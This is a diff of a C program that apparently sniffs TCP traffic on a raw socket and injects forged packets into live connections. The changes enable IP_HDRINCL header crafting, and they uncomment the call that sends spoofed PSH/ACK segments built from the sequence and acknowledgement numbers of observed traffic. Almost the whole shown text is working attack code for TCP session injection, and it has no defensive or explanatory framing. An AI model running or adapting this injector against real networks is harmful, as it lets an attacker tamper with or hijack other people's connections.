@@ -108,8 +108,14 @@ int main(int argc, char *argv[]) {
 
     // open attack socket
     if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-        perror("fakesync: socket\n");
+        perror("injection: socket\n");
         exit(1);
+    }
+
+    //Set option IP_HDRINCL (headers are included in packet)
+    if(setsockopt(attack_sock, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) < 0) {
+        perror("injection: setsockopt\n");
+        exit(-1);
     }
 
     // pre-fill TCP, IP and pseudo headers
@@ -148,7 +154,7 @@ int main(int argc, char *argv[]) {
     psh -> tcp_len = htons(tcp_len); // TCP segment length
 
     // Open sniff socket
-    if ((sniff_sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_TCP)) < 0) {
+    if ((sniff_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
         perror("fakesync: socket\n");
         goto error;
     }
@@ -177,7 +183,7 @@ int main(int argc, char *argv[]) {
             print_tcp_packet(buf, num); // log the packet;
 
             // send_synack(attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // syn ack
-            // send_pshack(sizeof data, attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq) + 1, ntohl(tcph->ack_seq)); // psh ack
+            send_pshack(sizeof data, attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq) + 1, ntohl(tcph->ack_seq)); // psh ack
             goto final;
         }
     }
